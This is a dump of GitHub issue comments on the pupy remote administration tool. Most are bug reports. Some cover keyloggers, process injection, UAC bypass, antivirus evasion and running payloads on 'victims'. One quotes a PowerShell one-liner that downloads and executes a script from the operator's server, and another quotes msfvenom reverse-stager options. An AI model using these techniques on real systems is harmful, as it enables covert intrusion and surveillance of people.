    "deathfantasy": "It's doable by writing an alternate transport and accompanying authenticator for rpyc, then the rest is plug-and-play.\n. I am eyeing the Tor pluggable transport mechanism; all we need to do is manage the PT proxy and wrap the rpyc socket under socks5 (using e.g. PySocks). obfsproxy is written in Python so we can perhaps even embed it in our process, I'll have to ask @n1nj4sec for that. I might do it if I have some time, but please chip in if you can.\n. Most of the size is in Twisted. Instead of ripping out the client obfsproxy code, you can gut Twisted to its minimum needed to run obfsproxy. I deleted most of the unneeded modules and got it down to 8.5 MB, and you can probably slim it down further. Same applies to other packages.\n. Could you push your code and the library file? I would like to have a look if possible.\nIs the library slimming scripted or manual?\n. Windows doesn't have pwd.\nTry exec cmd /c echo %cd% instead (or just start an interactive shell).\n. Works for me. Did you confuse it with the server exit command?\nTry run -f <id> exit --yes\n. info is an alias for the module get_info. So you can run info -f 'foo' or run -f 'foo' get_info, they are equivalent.\n. Open a python shell and run\nimport platform\nplatform.node()\nWhat do you get?\n. Just for reference, what is your actual hostname, and which encoding is it in? What is your system locale?\n. You are right @n1nj4sec, if the connection is closed abruptly then rpyc keeps calling the poller on the dead fd; however, their implementation of the poller (SelectingPoll class in rpyc/lib/compat.py) use select.select(), which does not handle dead fd event like select.poll().\nI made a patch on my rpyc fork, but it's a rather dirty hack, and there might be a better way of signaling select() failure (the workaround calls select() again individually on each fd to test whether it's alive, which is very suboptimal, and only works for a few clients).\n. It's for GNU make, since I had some troubles using nmake.\n. It crashes with x64->x64 migration on Windows 10. x64->x86 works fine.\n. I found out that x64 keylogger doesn't work on my computer either; but x86 still works fine.\nThere is a probability that it's a peculiarity in my Windows setup, so I gues I will just leave it as is unless I manage to find out why.\n. ",
    "shellster": "Maybe not the right thread, but one transport I'd like to see is SSH via the paramiko library.\nTo toot my own horn, I recently made major changes to MeterSSH, which just got pulled into the original tool.  Using the library is pretty straightforward (as can be seen in the MeterSSH source).  The nice thing about SSH is the portfwd can be completely transparent to the client and server.\n. Even better!\n. It also appears that tty is not available, but termios is.\n. Good catch.  I remotely loaded pty and tty and now I have a shell, but it isn't a true shell in my case.  Can you run sudo commands and the like?  I get errors about it not being a proper tty when I try.  It could be there is something broken still, on mine.  Also I loaded pty and tty libraries from my linux server, so they may not be the correct ones.\n\u2592  / sudo ls -al\nsudo: no tty present and no askpass program specified\n\u2592  /\nP.S.  In case I'm not the only one having this issue, it looks like OSX comes with expect by default, so I was able to temporarily get around my issues with:\nshell -T\nexpect -c 'spawn bash; interact'\n. Rebuild Pyinstaller payload for OSX/Ubuntu with the following hidden imports and now it works (may indicate that there needs to be some additional work to make pyinstaller builds easier):\nuuid, pty, tty\nClosing this issue.\n. [Errno 24] Too many open files: None\n========= Remote Traceback (1) =========\nTraceback (most recent call last):\n  File \"rpyc/core/protocol.py\", line 305, in _dispatch_request\n  File \"rpyc/core/protocol.py\", line 535, in _handle_call\n  File \"subprocess.py\", line 566, in check_output\n  File \"subprocess.py\", line 702, in init\n  File \"subprocess.py\", line 1111, in _get_handles\n  File \"subprocess.py\", line 1167, in pipe_cloexec\nOSError: [Errno 24] Too many open files\nHere's the stack trace I see.\n. I think I figured out the issue (with @mandreko's help).  I'm running pupy through pyinstaller builds. \nIn pupy/pupy/packages/all/interactive_shell.py, near the top, is this line\nON_POSIX = 'posix' in sys.builtin_module_names\nThis is later used in the file in Popen requests to set close_fds.  close_fds needs to be True in a POSIX environment, however pyinstaller isn't correctly including the posix module in builds.  Therefore I'm updating the description of this issue.  Currently, I have found that to create a linux/OSX client using pyinstaller, the following hidden imports must be included to get a correct build:\n- uuid\n- tty\n- pty\n- posix\n. Unfortunately adding posix still resulted in an eventual crash with the previous error about too many open files.  Not sure what is the root cause at this point.\n. I'll check lsof next time it pops up.  I (apparently) reduced the occurrence of the error by increasing ulimit -n.  The problem is definitely exacerbated (maybe caused by) the nmap connect scanning through the socks proxy module.\n. Alright, I captured some lsof output.  The pyinstaller payload is called \"run\".  There are just thousands of entries like this:\nrun        2911       root  653u     sock                0,7       0t0   25540522 can't identify protocol\nrun        2911       root  654u     sock                0,7       0t0   25540861 can't identify protocol\nrun        2911       root  655u     sock                0,7       0t0   25540574 can't identify protocol\nrun        2911       root  656u     sock                0,7       0t0   25540575 can't identify protocol\nrun        2911       root  657u     sock                0,7       0t0   25540823 can't identify protocol\nWhen connect scanning with nmap, the shell becomes unusable due to unending errors like this (which also post in the main pupysh window.):\n```\nException happened during processing of request from ('127.0.0.1', 57307)\nTraceback (most recent call last):\n  File \"/usr/lib/python2.7/SocketServer.py\", line 599, in process_request_thread\n    self.finish_request(request, client_address)\n  File \"/usr/lib/python2.7/SocketServer.py\", line 334, in finish_request\n    self.RequestHandlerClass(request, client_address, self)\n  File \"/usr/lib/python2.7/SocketServer.py\", line 655, in init\n    self.handle()\n  File \"[redacted]/pupy/pupy/modules/socks5proxy.py\", line 145, in handle\n    self._socks_response(CODE_NET_NOT_REACHABLE, terminate=True)\n  File \"[redacted]/pupy/pupy/modules/socks5proxy.py\", line 85, in _socks_response\n    self.request.shutdown(socket.SHUT_RDWR)\n  File \"/usr/lib/python2.7/socket.py\", line 224, in meth\n    return getattr(self._sock,name)(*args)\nerror: [Errno 107] Transport endpoint is not connected\n\n```\n. Alright, after reading up on sockets, I believe I have finally figured out the issue.  The first issue, as shown above, is that the self.request.shutdown(socket.SHUT_RDWR) on line 85 is not being wrapped in a try/except, thus making pupy more-or-less unusable when performing connect scanning over the proxy, thanks to the constant error messages. \nThe bigger issue I believe, is that each instance of request.shutdown(...) and request.close() need to be separately wrapped in try/except blocks.  The reason for this, as I understand it, is that request.shutdown(...) will throw an exception if there is data in the buffer waiting to be sent to the remote socket.  This happens whenever the server doesn't respond (such as when you scan a non-existent ip).  In this event, you still want to forcibly close the socket, otherwise, the module will continue to hold open the socket, which eventually results in the \"OSError: [Errno 24] Too many open files\" error.\nFor reference, please refer to this Stack Overflow question, especially the last comment: http://stackoverflow.com/questions/409783/socket-shutdown-vs-socket-close\nP.S.  I'm happy to update the module and send in a pull request if you agree with my proposed fix.\n. I reviewed the patch and I believe it fixes the issue.  Unfortunately, I can't test it this week.  I'll reply to this issue once I have had a chance to test it.\n. ",
    "kilbyjmichael": "I think it would be cool if the keylogger could dump to a file too.\n. Apparently my git clone didn't work exactly as planned. Sorry man!\n. ",
    "golind": "That should be an easy change, really just a change in /modules/keylogger.py (thanksninja), so it streams to a file. Personally I would like more timestamps and active window names.\n. @Demannu this should cover it i think: https://github.com/n1nj4sec/pupy/pull/44\n. Will be back with changes.\n. will be back with changes.\n. Seriously? I fail at this.....\n. ",
    "Demannu": "I'll see if I can get this done and push it to the main.\n. ",
    "MarioVilas": "But doesn't it require the dll to be physically stored on disk somewhere?\n(Sorry if this is a dumb question, I seldom use Metasploit...)\nOn Wednesday, September 23, 2015, n1nj4sec notifications@github.com wrote:\n\nactually there is :-)\ntake a look at metasploit all the windows/dllinject/* shellcodes\nmsfvenom -p windows/dllinject/reverse_winhttp --payload-options\nOptions for payload/windows/dllinject/reverse_winhttp:\nName: Reflective DLL Injection, Windows Reverse HTTP Stager (winhttp)\n Module: payload/windows/dllinject/reverse_winhttp\nPlatform: Windows\n       Arch: x86\nNeeds Admin: No\n Total size: 357\n       Rank: Normal\nProvided by:\n    sf javascript:_e(%7B%7D,'cvml','stephen_fewer@harmonysecurity.com');>\n    hdm javascript:_e(%7B%7D,'cvml','hdm@metasploit.com');>\n    Borja Merino javascript:_e(%7B%7D,'cvml','bmerinofe@gmail.com');>\nBasic options:\nName      Current Setting  Required  Description\n\nDLL                        yes       The local path to the Reflective DLL to upload\nEXITFUNC  process          yes       Exit technique (Accepted: , , seh, thread, process, none)\nLHOST                      yes       The local listener hostname\nLPORT     8080             yes       The local listener port\nAnd even the size isn't an issue anymore :-) !\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/n1nj4sec/pupy/issues/14#issuecomment-142572170.\n\n\n\u201cThere's a reason we separate military and the police: one fights the enemy\nof the state, the other serves and protects the people. When the military\nbecomes both, then the enemies of the state tend to become the people.\u201d\n. ",
    "belko-letyago": "Win7 x64\n. Issue is still reproducible:\n```\n\n\nsessions\nTraceback (most recent call last):\n  File \"./pupysh.py\", line 62, in \n    pcmd.cmdloop()\n  File \"/root/pupy/pupy/pupylib/PupyCmd.py\", line 259, in cmdloop\n    cmd.Cmd.cmdloop(self, intro)\n  File \"/usr/lib/python2.7/cmd.py\", line 142, in cmdloop\n    stop = self.onecmd(line)\n  File \"/usr/lib/python2.7/cmd.py\", line 221, in onecmd\n    return func(arg)\n  File \"/root/pupy/pupy/pupylib/PupyCmd.py\", line 435, in do_sessions\n    self.display(PupyCmd.table_format([x.desc for x in client_list], wl=[\"id\", \"user\", \"hostname\", \"platform\", \"release\", \"os_arch\", \"address\"]))\n  File \"/root/pupy/pupy/pupylib/PupyCmd.py\", line 194, in table_format\n    diclist=obj2utf8(diclist)\n  File \"/root/pupy/pupy/pupylib/PupyCmd.py\", line 113, in obj2utf8\n    obj[i]=obj2utf8(obj[i])\n  File \"/root/pupy/pupy/pupylib/PupyCmd.py\", line 110, in obj2utf8\n    obj[k]=obj2utf8(obj[k])\n  File \"/root/pupy/pupy/pupylib/PupyCmd.py\", line 120, in obj2utf8\n    return obj.encode('utf8', errors='replace')\nUnicodeDecodeError: 'ascii' codec can't decode byte 0xd0 in position 5: ordinal not in range(128)\ninfo\nmacaddr   : FF:FF:FF:FF:FF:FF\npid       : 7392\nexec_path : C:\\Users\\user\\Downloads\\pupy.exe\naddress   : 127.0.0.1\nproc_arch : 64bit\nhostname  : user-\u041f\u041a\nos_arch   : AMD64\nversion   : 6.1.7601\nrelease   : 7\nrun pyshell\nPython 2.7.10 (default, May 23 2015, 09:44:00) [MSC v.1500 64 bit (AMD64)] on win32\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n(InteractiveConsole)\n\nimport platform\nplatform.node()\n'user-\\xcf\\xca'\n```\n. Hostname is \"user-\u041f\u041a\". \nEncoding: 1251\nSystem locale: Russian :)\n\n\n\n``` python\n\n\n\nprint 'user-\\xcf\\xca'.decode('cp1251')\nuser-\u041f\u041a\n```\n. Root cause found:\ndesc['hostname'] is already utf8 encoded while trying to obj.encode('utf8', errors='replace')\n\n\n\n```\n\n\nclients\nTraceback (most recent call last):\n  File \"./pupysh.py\", line 62, in \n    pcmd.cmdloop()\n  File \"/root/pupy/pupy/pupylib/PupyCmd.py\", line 259, in cmdloop\n    cmd.Cmd.cmdloop(self, intro)\n  File \"/usr/lib/python2.7/cmd.py\", line 142, in cmdloop\n    stop = self.onecmd(line)\n  File \"/usr/lib/python2.7/cmd.py\", line 221, in onecmd\n    return func(arg)\n  File \"/root/pupy/pupy/pupylib/PupyCmd.py\", line 406, in do_clients\n    self.do_sessions(arg)\n  File \"/root/pupy/pupy/pupylib/PupyCmd.py\", line 435, in do_sessions\n    self.display(PupyCmd.table_format([x.desc for x in client_list], wl=[\"id\", \"user\", \"hostname\", \"platform\", \"release\", \"os_arch\", \"address\"]))\n  File \"/root/pupy/pupy/pupylib/PupyCmd.py\", line 194, in table_format\n    diclist=obj2utf8(diclist)\n  File \"/root/pupy/pupy/pupylib/PupyCmd.py\", line 113, in obj2utf8\n    obj[i]=obj2utf8(obj[i])\n  File \"/root/pupy/pupy/pupylib/PupyCmd.py\", line 110, in obj2utf8\n    obj[k]=obj2utf8(obj[k])\n  File \"/root/pupy/pupy/pupylib/PupyCmd.py\", line 120, in obj2utf8\n    return obj.encode('utf8', errors='replace')\nUnicodeDecodeError: 'ascii' codec can't decode byte 0xd0 in position 5: ordinal not in range(128)\npython\nPython 2.7.9 (default, Mar  1 2015, 12:57:24) \n[GCC 4.9.2] on linux2\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n(InteractiveConsole)\n\npupsrv.clients[0].desc['hostname'] = pupsrv.clients[0].desc['hostname'].decode('utf8')\nclients\nid  user  hostname   platform  release  os_arch  address        \n\n\n\n\n1   user  user-\u041f\u041a    Windows   7        AMD64    127.0.0.1\n```\n. I will try to reproduce this issue tomorrow on my work pc.\nHow can I get more information about this error?\n. On another pc I get this error with x64 payload and x64 win7.\n. https://msdn.microsoft.com/en-us/library/ms235560(v=vs.90).aspx\nMSDN says that this error happen when application is loading the C runtime library without using a manifest. Could you try to add manifest when building payloads?\n. Great! I don't see the popups anymore.\n. #23 ?\n. What do you think about changing default port to avoid confusion with https?\n. I have just reproduced this.\nWhen I start client, Kaspersky Internet Security(avp.exe) is trying to establish connection to my server at port 443 what  causes this error.\n. ",
    "asaf53409": "@n1nj4sec \nHi I try to use with dnscsc, maybe can you help with this?\nHow to return requests to the server?Is there a need to use with pupysh.py . ",
    "marte3707": "I' ve the same problem. tried to change the port in pupy.conf from 443 to 4444 but aslo have the problem\n. ",
    "cacaocaca": "I use port 443 The same problem my machine is kali linux 2.0 yes i start puppy as root and i no see program listen when i start root@kali:~# netstat -anpt | grep LISTEN\ntcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      791/postgres\ntcp        0      0 127.0.0.1:9391          0.0.0.0:*               LISTEN      765/openvassd: Wait\ntcp        0      0 127.0.0.1:9392          0.0.0.0:*               LISTEN      658/gsad\ntcp        0      0 127.0.0.1:5939          0.0.0.0:*               LISTEN      797/teamviewerd \ntcp6       0      0 ::1:5432                :::*                    LISTEN      791/postgres\ntcp6       0      0 :::80                   :::*                    LISTEN      5583/apache2    \nPlease resolve this issue thanks ..\n. Ok i see now the problem is when i use my pubblich ip while if i use my local ip and edit pupy.conf work but i would like he work with ip pubblic .. Congratulation for your work .\n. ",
    "ghost": "Sry for reopening this topic but i have the same problem \nmy pupy.conf listen on port 443 and my exe too\n#listen on all interfaces by default\naddress = 192.168.10.220\nport = 443\nipv6 = true\nkeyfile = crypto/server.pem\ncertfile = crypto/cert.pem\n...\nIf i want to start pupysh.py, i've got this output\n`[*] Server started on 192.168.10.220 port 443 with transport ssl\n\n\nERROR:root:[Errno 99] Cannot assign requested address\nTraceback (most recent call last):\n  File \"/home/flo/Dokumente/pupy/pupy/pupylib/PupyServer.py\", line 526, in run\n    self.server = t.server(PupyService.PupyService, port = self.port, hostname=self.address, authenticator=authenticator, stream=t.stream, transport=t.server_transport, transport_kwargs=t.server_transport_kwargs, ipv6=self.ipv6)\n  File \"/home/flo/Dokumente/pupy/pupy/network/lib/servers.py\", line 225, in init\n    ThreadPoolServer.init(self, _args, _kwargs)\n  File \"/usr/local/lib/python2.7/dist-packages/rpyc/utils/server.py\", line 304, in init\n    Server.init(self, _args, _kwargs)\n  File \"/usr/local/lib/python2.7/dist-packages/rpyc/utils/server.py\", line 78, in init\n    self.listener.bind((hostname, port))\n  File \"/usr/lib/python2.7/socket.py\", line 228, in meth\n    return getattr(self._sock,name)(*args)\nerror: [Errno 99] Cannot assign requested address\n`\n\n\nWithout root it looks like this\n`[*] Server started on 192.168.10.220 port 443 with transport ssl\n\n\nERROR:root:[Errno 13] Permission denied\nTraceback (most recent call last):\n  File \"/home/flo/Dokumente/pupy/pupy/pupylib/PupyServer.py\", line 526, in run\n    self.server = t.server(PupyService.PupyService, port = self.port, hostname=self.address, authenticator=authenticator, stream=t.stream, transport=t.server_transport, transport_kwargs=t.server_transport_kwargs, ipv6=self.ipv6)\n  File \"/home/flo/Dokumente/pupy/pupy/network/lib/servers.py\", line 225, in init\n    ThreadPoolServer.init(self, _args, _kwargs)\n  File \"/usr/local/lib/python2.7/dist-packages/rpyc/utils/server.py\", line 304, in init\n    Server.init(self, _args, _kwargs)\n  File \"/usr/local/lib/python2.7/dist-packages/rpyc/utils/server.py\", line 78, in init\n    self.listener.bind((hostname, port))\n  File \"/usr/lib/python2.7/socket.py\", line 228, in meth\n    return getattr(self._sock,name)(*args)\nerror: [Errno 13] Permission denied\n`\n\n\nWould be glad, if you can help me\n. In android all you have to do is run the \"su\" command, it's not complicated to do.. it work :). Had the same issue, just git clone lazagne by yourself to /root/pupy/pupy/external\nAnd then rerun submodule update. That's a different issue.\nI am using openssl with git though, so you may want to rebuild git with openssl instead of GnuTLS and try again.\n. Just a quick update, I ended up fixing the dumbnet issue by installing libdnet through homebrew.\nStill no sessions opened though.. Ok i am glad i cand help with something. ",
    "holyknightrolex": "I also have the same problem on cannot assign requested address and i dont know to fox it.. Im glad someone can help with this issue\n. ",
    "EnhboldH": "When victim click my payload I got this error \nTraceback (most recent call last):\n  File \"/usr/lib/python2.7/threading.py\", line 801, in bootstrap_inner\n    self.run()\n  File \"/usr/lib/python2.7/threading.py\", line 754, in run\n    self.__target(*self.__args, self.kwargs)\n  File \"/root/Desktop/tools/pupy/pupy/network/lib/servers.py\", line 119, in _setup_connection\n    config=config\n  File \"/root/Desktop/tools/pupy/pupy/network/lib/connection.py\", line 35, in __init\n    Connection.init(self, *args, kwargs)\nTypeError: __init() got an unexpected keyword argument '_lazy'\nException AttributeError: \"'PupyConnection' object has no attribute '_closed'\" in  ignored\nException in thread Thread-6:\nTraceback (most recent call last):\n  File \"/usr/lib/python2.7/threading.py\", line 801, in bootstrap_inner\n    self.run()\n  File \"/usr/lib/python2.7/threading.py\", line 754, in run\n    self.__target(*self.__args, self.kwargs)\n  File \"/root/Desktop/tools/pupy/pupy/network/lib/servers.py\", line 119, in _setup_connection\n    config=config\n  File \"/root/Desktop/tools/pupy/pupy/network/lib/connection.py\", line 35, in __init\n    Connection.init(self, *args, kwargs)\nTypeError: __init() got an unexpected keyword argument '_lazy'\n|----------------------------------------------------------------------|\n| #SOLVED  pip uninstall rpyc && pip install rpyc==3.4.4 |\n|----------------------------------------------------------------------|. ",
    "Livebullshit": "I wish to be able to use PyInstaller also. Well mainly being able to get my hand on the pre compiled code before it become a PE. \nBecause the problem is, the binary generated by pupy are flagged by most A/V\nAnd btw, really nice work done here n1nj4sec on pupy, i love it\n. Thx, i did that and .... worked like a charm :+1: \nSorry for the delay in my response\n. ",
    "marcovillar": "Can you share what you done exactly? i been trying to figure out how to bypass a simple av\nwithout any luck:/ i read everything i could on loadmodule project to understand how its working (coming from a unix backgroud) but i didnt understand the whole decode your buffer at execution :/\nWould love to get some input from people who already succeed doing so.\nThanks in advance.\n. Windows 2008 r2 as well, btw when i migrated to another x64 process (explorer.exe)\nit worked fine as well which i find very strange.\n. ",
    "danny1991": "same problem here! some infos!\nOS Server: Kali Linux 2 x64\nOS Victim: Windows 7 x64\nPayload: x64\ntrying to migrate to winlogon.exe or svchost.exe I got this error:\n```\n\n\nrun manage/migrate -c winlogon.exe\n[+] winlogon.exe created with pid 6700\n[+] looking for configured connect back address ...\n[+] address configured is 192.168.1.11:443 ...\n[+] looking for process 6700 architecture ...\n[+] process is 64 bits\n[+] injecting DLL in target process 6700 ...\n[-] [INJECT] inject_dll. VirtualAllocEx 2 failed\n\n\n========== Remote Traceback (1) ==========\nTraceback (most recent call last):\n   File \"C:\\Python27\\Lib\\site-packages\\rpyc\\core\\protocol.py\", line 305, in _dispatch_request\n   File \"C:\\Python27\\Lib\\site-packages\\rpyc\\core\\protocol.py\", line 535, in _handle_call\nException: [INJECT] inject_dll. VirtualAllocEx 2 failed\n```\n. true it is working! but I will a try a test to create a process in C:\\Windows\\System32\\test.exe to see if he create it and making it run after the machine is restarted!\n. I think in config file, this should work? I don't know... :D\n```\n[on_connect]\nrun_module = gather/keylogger start\n```\n. ",
    "quentinhardy": "Hello,\nI have done some tests on Wind8.1,x64 architecture.\nWhen I migrate the remote x64 pupy process to another x64 process (e.g powershell.exe), the remote pupy process stops working.\nNotice this bug has not occurred on win7,x64 for me.\nI think the error come from inject_dll function in base_inject.c.\nTo sum up tests that I have done on Wind8.1x64:\n-> From pupy.exe x86:\n- migrate to x64 process: OK (e.g. Powershell.exe, x64)\n- bypass UAC: OK\n- getsystem after bypassuac: KO (see https://github.com/n1nj4sec/pupy/issues/124)\n- getsystem after \"run as administrator\": OK\n-> From pupy.exe x64:\n- migrate to x64 process: KO (Bug reported here).\n- bypass UAC: OK\n- getsystem after bypassuac: KO (see https://github.com/n1nj4sec/pupy/issues/124)\n- getsystem after \"run as administrator\": KO (No crach but no reverse shell. Consequently, error occured somewhere).\n-> From pupy.dll x64:\n- inject dll with Invoke-ReflectivePEInjection: OK\n- migrate to x64 process: KO (Bug reported here)\n- bypass UAC: OK\n- getsystem after bypassuac: KO (see https://github.com/n1nj4sec/pupy/issues/124)\n- getsystem after \"run as administrator\": KO (see https://github.com/n1nj4sec/pupy/issues/124)\nAs soon as I have enough time, I will try to fix this bug.\n. aesshell (https://github.com/curesec/tools/tree/master/aesshell) has not an interactive shell for Windows.\nI don't know a python module for having interactive shell on Windows -:(\n. Interactive shell on Windows is OK now. I think this issue can be closed. Thank you for ptyshell. . On a rooted Android device, su command can be used for having a root shell.\nI think this issue can be closed now.. Good news for the filter feature when session -i is used.\nI was talking about the list_modules command. I think it will be great to know possible target types (windows, Linux, etc.) of each module when you use this command.\n. I think also the Bypass UAC feature should be very interesting.\nIndeed, if I don't do a mistake, if you have a shell on a target with a user in administrators' group (net localgroup administrators), you can't not yet get a system shell with a \"built-in\" feature.\nThere are many techniques to bypass the UAC. Here is an example (DLL hijacking): http://null-byte.wonderhowto.com/how-to/bypass-uac-using-dll-hijacking-0168600/. See Additional Info part.\nSee also https://www.greyhathacker.net/?tag=hijack and https://github.com/Cn33liz/p0shKiller/tree/master/UacBypass\n. Avast detects the powershell script Invoke-ReflectivePEInjection.ps1 when the source code is downloaded on the target over http.\nThis source code is not stored on the target but Avast does network \"inspection\", over http at least.\nWhen the target executes iex (New-Object System.Net.WebClient).DownloadString(\"http://%s:%s/rpi\") (see ps1_oneliner.py file), the Invoke-ReflectivePEInjection.ps1 source code is detected by Avast. \nProbably some strings are detected in this script. If the source code is encoded or encrypted before loading in memory, I think it will avoid detection by Antivirus.\n. Bug reported at psutil, psutil.process_iter() function : https://github.com/giampaolo/psutil/issues/846\n. Last commits are for adding a new module named BypassUAC. This module uses Invoke-BypassUAC.ps1 (from Empire) and Invoke-ReflectivePEInjection.ps1 (from Powersploit) for bypassing UAC.\nMoreover, a commit (https://github.com/n1nj4sec/pupy/pull/113/commits/0dbb731cd54f4b25e48263ee7d6db4e5729332e5) prints 'proc_arch' in output of 'sessions'. I think it is useful.\nTests are been done on both Wind7 x64 and Wind7 x86 with Avast Antivirus.\nAccording to Invoke-BypassUAC.ps1, this module \"should work on both Windows 7 and Windows 8/8.1\" (https://github.com/quentinhardy/pupy/blob/93602d766f76a5f5acbef2452a6772ba16cfb888/pupy/external/Empire/privesc/Invoke-BypassUAC.ps1).\nWhen I will have time, I will do new commits for cleaning files created and for a better UAC bypass exploitation for doing fewer operations remotely.\n. Mistakes in the code\n. For information, the same error occurs on wind10 (x64) after a UAC bypass and get system: The remote process stops working.\n```\n\n\ninfo\nhostname  : DESKTOP-X\n[...]\nrelease   : 10\nversion   : 10.0.10240\nos_arch   : AMD64\nproc_arch : 64bit\npid       : 1200\nexec_path : C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe\n[...]\nuac_lvl   : 2/3\nintgty_lvl: High\ntransport : ssl\nlauncher  : connect\nrun getsystem \nDEBUG:root:package psutil loaded on win_DESKTOP-X from path=packages/windows/amd64\nDEBUG:root:package pupwinutils.security loaded on win_DESKTOP-X from path=packages/windows/all\n```\n. More precisely, the bug comes from getsystem function.\n\n\nI have tested getsystem module on wind7, 8.1 and 10. See following results:\nOn Wind10 (x64):\n-> Test 1\n1. Migrate to another process (e.g. notepad.exe): OK \n2. BypassUAC: OK\n3. getsystem: KO (Stop working)\n-> Test 2\n1. Run pupy from a privileged shell (\"run as administrator\" option): KO (Stop working)\nOn Wind8.1 (x64):\n-> Test 1\n1. Migrate to another process (e.g. notepad.exe): OK\n2. BypassUAC: OK\n3. getsystem: KO (Stop working)\n-> Test 2\n1. Run pupy from a privileged shell (\"run as administrator\" option): KO (Stop working)\nOn Wind7 (x64):\n-> Test 1\n1. Migrate to another process (e.g. notepad.exe): OK\n2. BypassUAC: OK\n3. getsystem: OK\n-> Test 2\n1. Run pupy from a privileged shell (\"run as administrator\" option): OK\nSame results on Wind8.1 and Wind10: bug in getsystem module. No bug on Wind7.\n. This bug seems fixed.\nI have tested this module BypassUAC on wind10_x64 from a x32 process with ps1_oneliner. No problem anymore.\nNotice from a x64 process, the following message is printed:\nOSError: Can't let you to do that because a well known bug is not fixed yet, migrate to a 32 bits process and run this action again.\nEx: run migrate -c 'C:\\Windows\\SysWOW64\\notepad.exe'\nOf course, not a problem -:)\nI think this issue could be closed.\n. +1 for this Powershell feature. \nUseful for bypassuac feature for example. \nI will modify the bypassuac code as soon as this feature will be put in the master branch.\n. Hi, \nGreat idea for ps1 to \"other executable file format\" +1.\nPull request which implements ps1 output: https://github.com/n1nj4sec/pupy/pull/141\n. Hello,\nFor me, when I convert the ps1 file to an executable format, the executable file is smaller than the ps1 file (19mo to 14mo).\nThe ps1 file is big because the x86 and x64 pupy dll are embedded.\nIf you know the target architecture, you can modify few lines in ps1 source code(at the end) for not embedded the x86 or x64 dll.\nAn option for ps1 output could be created for choosing the target architecture (19mo to 9mo and perhaps to 6mo with an executable format).\nOtherwise, you can use the ps1_oneliner output.\n. Sorry for the commit 286e013027d26fb903c39cb67a4998ee1e02ee4c, it should not be here.\n. Good idea. Implemented here https://github.com/n1nj4sec/pupy/pull/151. Only for Windows targets for the moment.\n. Hello,\nFor bypassing AV, you can use ps1_oneliner payload or ps1 payload for example. See https://github.com/n1nj4sec/pupy/blob/master/pupy/pupygen.py, line 266\n. Securityreactions ?! https://67.media.tumblr.com/[...].gif\nSorry for that @ta69 , but your first question on Github is epic :100: \n. You have to install rpyc...\nYou can install pip on your system (perhaps see http://softwaretester.info/install-and-upgrade-pip-on-mac-os-x/) or http://stackoverflow.com/questions/17271319/installing-pip-on-mac-os-x\nsudo easy_install pip\nand after install your python modules (e.g. rpyc)\nsudo pip install rpyc\nThese python modules have to be installed (See requirements.txt):\n- rpyc\n- pycrypto\n- pefile \n- pyyaml\n- image\n- rsa\n- netaddr\nSee https://github.com/n1nj4sec/pupy/wiki/Installation for pupy installation.\n. For installing pyasn1 (missing module on your OSX), you can use the following command:\npip install pyasn1\n. Dll is obfuscated and embedded in script Invoke-ReflectivePEInjection.ps1 now (see 1e7407674979c445db4a4e0d1b5bba4007fa2718). No longer detected by AV.\n. PowerView is a very good tool. As soon as possible, I will create argparse commands for this module, for a better usage.\n. Thanks you @AlessandroZ for the work -:)\nAs soon as these commits will be accepted, I will retest again this module in different configurations for knowing if there is not bugs.\n. You have to be root for opening a listening port between 1-1024 on Linux. Use the following keyword in Google for example: \"Privileged Ports Linux\".\nYou can run pupysh.py with sudo for example:\nsudo ./pupysh.py\nFor information about sudo, see https://help.ubuntu.com/community/RootSudo\n. You have true. \nThe pupyx86.so is missing, as pupyx86.lin in https://github.com/n1nj4sec/pupy-binaries.\n. Hi. \nI think the best solution (time/result) is to use Powershell output (script or oneliner) of Pupy when your target is WIndows.\nSee https://github.com/n1nj4sec/pupy/issues/168 about this same subject. See also these old issues:\n- https://github.com/n1nj4sec/pupy/issues/41\n- https://github.com/n1nj4sec/pupy/issues/34\n. The commit 73eaccf3432386b606ccc473af3eb2e6d2eb30bd is an error. Commit reverted (see 40e164b966fb172d35296d40b6bb1cafcca568ac).. You have to install the python package named win_inet_pton.\nYou can install this package with the following command for example:\npip install win_inet_pton. Hi,\nCan you clarify your question please?. lol, thank you for your definition about shellcode.... The command to use for example (for an apk): \npython pupygen.py -f apk connect --host 192.168.1.150:444\nOtherwise, folder named payload_templates has to have pupy templates. They can be found here: https://github.com/n1nj4sec/pupy-binaries. \"webcamsnap take Black screen\": Have you tried to select the other cam (\"front cam\")?\nBy default, the \"back cam\" is used for taking a photo: Of course, if your phone is on a table, the picture will be all black. -:). Tested on 4.4.2 and no problem with webcamsnap module. Yes. I'm developing it.\nIt will be finished this week end.. I think data will grow until the app crashes.\nIt is why I can modify source code for saving data in a file.... Done in the commit 69fa51de1ebda571ac1582e90535c5f0e6cbb3fd.\nNow, GPS data is stored in a file on device by default.\nUse -m option for GPS data in memory process only (no file created on the device).. These following commits are here for adding a new module named call:\n\n89b455c5e36c8d44c6d32fd7f5b3e79600009764\n2e5fcfbb5f03a40623bb77aeeb24e1aa77403f77\n\nYou can get all call details for the moment with this module.\n. The password hashed is stored in /data/system/gesture.key.\nFor accessing to this file, you have to be root in my opinion.\nI think it is not possible to find a way to read this file without to be root from an app (without exploiting a vulnerability in Android).. Perhaps after but not for the moment: I work only on non-root modules for the moment.. The apk generated by default by pupy has not the ACCESS_NETWORK_STATE permission. This is why you have this error: \"user 10157 nor current process has android.permission.ACCESS_NETWORK_STATE\".\nThis permission has to be append to the manifest file of the apk template.\nYou can use this method for modifying permissions of the apk for example: https://www.reddit.com/r/Android/comments/11852r/how_to_modify_an_apk/. Hello,\nThere is an issue with the release apk when you build it from source.\nI have not your error while I am in the same environment (Kali 2016.2).\nThere is no error when I generate/compile the release apk from source but the application does not start correctly because I have not a reverse shell. The apk does not try to connect to my controller for example. I have analysed apk logs but I don't know where the issue comes from.\nEDIT: Following explanations  are no longer true (I have just re-tested):\n\nHowever, when I create a debug apk by modifying the build.sh, I have no problem to use it on my device (I have a remote shell).\n```\n\nbuildozer android release\nbuildozer android debug\necho \"copying the generated apk to ../../pupy/payload_templates/pupy.apk\"\ncp bin/Pupy-0.1-release-unsigned.apk ../../pupy/payload_templates/pupy.apk\ncp bin/Pupy-0.1-debug.apk ../../pupy/payload_templates/pupy.apk\n```\n\nOf course, you have to sign the debug apk before use it for creating pupy.apk file.\n\nI had already this error 1-2 month ago.. Good thing when you would like pivoting to another network unreachable directly.... I have tested with some Chinese words in a program name and the ps command shows ????? instead of special chars. 